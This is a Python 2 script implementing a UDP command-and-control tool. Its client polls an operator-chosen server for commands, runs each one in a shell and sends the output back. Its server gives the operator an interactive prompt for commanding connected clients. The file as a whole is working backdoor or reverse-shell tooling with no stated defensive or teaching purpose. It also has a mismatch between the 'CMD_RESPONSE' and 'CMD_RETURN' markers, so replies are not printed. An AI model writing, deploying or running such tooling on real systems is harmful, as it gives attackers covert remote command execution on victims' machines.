import argparse
import socket
import subprocess
import time


argparser = argparse.ArgumentParser()
arggroup = argparser.add_mutually_exclusive_group()
arggroup.add_argument('--client', nargs=3, metavar=('server_ip', 'server_port', 'sleep_value'), help='starts client mode')
arggroup.add_argument('--server', nargs=2, metavar=('bind_ip', 'bind_port'), help='starts server mode')
argparser.parse_args(['--client', 'svr_ip', 'svr_port', 'sleepval'])
argparser.parse_args(['--server', 'bind_ip', 'bind_port'])
args = argparser.parse_args()


def connect_svr(svr_ip, svr_port, sleepval):
    '''
    :param svr_ip: String IPv4 addr of the server
    :param svr_port: Int UDP port of the server
    :param sleepval: Int value in seconds to sleep
    :return: Nothing
    '''
    while True:
        clt_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        clt_sock.sendto('CMD_REQUEST', (svr_ip, int(svr_port)))
        execcmd, svr_addr = clt_sock.recvfrom(4096)
        clt_sock.sendto(execute_cmd(execcmd), (svr_ip, int(svr_port)))
        clt_sock.close()
        time.sleep(int(sleepval))


def execute_cmd(cmd):
    '''
    :param cmd: String command to execute on the client system.
    :return: String output of the command, will be sent to the server.
    '''
    command = cmd.rstrip()

    try:
        cmd_response = 'CMD_RESPONSE\n' + subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        cmd_response = 'CMD_RESPONSE: command failed!\n'

    return cmd_response


def bind_svr(bind_ip, bind_port):
    '''
    :param bind_ip: String IPv4 addr the controller will bind to.
    :param bind_port: Int IPv4 UDP port the controller will bind to.
    :return: Nothing
    '''
    svr_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    svr_sock.bind((bind_ip, int(bind_port)))
    print 'Binding the server on %s:%d' % (bind_ip, int(bind_port))

    while True:
        cmd_request, clt_addr = svr_sock.recvfrom(4096)
        print 'Received a connection from %s:%d\n' % (clt_addr[0], clt_addr[1])
        print 'Received a request: %s\n' % cmd_request
        if 'CMD_REQUEST' in cmd_request:
            cmd_buf = raw_input(clt_addr[0] + ' SEND>> ')
            svr_sock.sendto(cmd_buf, (clt_addr[0], clt_addr[1]))
        elif 'CMD_RETURN' in cmd_request:
            print "%s\n" % cmd_request


def main():
    if args.client:
        connect_svr(args.client[0], args.client[1], args.client[2])
    elif args.server:
        bind_svr(args.server[0], args.server[1])
    else:
        argparser.error('-c/--client or -s/--server must be used.')
        exit()


if __name__ == '__main__':
    main()